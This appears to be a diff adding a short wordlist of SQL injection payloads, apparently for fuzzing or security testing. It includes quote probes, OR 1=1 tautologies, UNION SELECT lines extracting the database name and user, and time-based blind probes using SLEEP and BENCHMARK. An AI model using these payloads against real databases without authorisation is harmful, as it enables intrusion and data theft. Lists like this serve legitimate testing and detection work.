@@ -1,0 +1,13 @@
+'
+''
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1'--
+' OR '1'='1'#
+' AND 1=1--
+' AND 1=2--
+' UNION SELECT null,null--
+' UNION SELECT null,database()--
+' UNION SELECT null,user()--
+' OR SLEEP(5)--
+' OR BENCHMARK(1000000,MD5(1))--
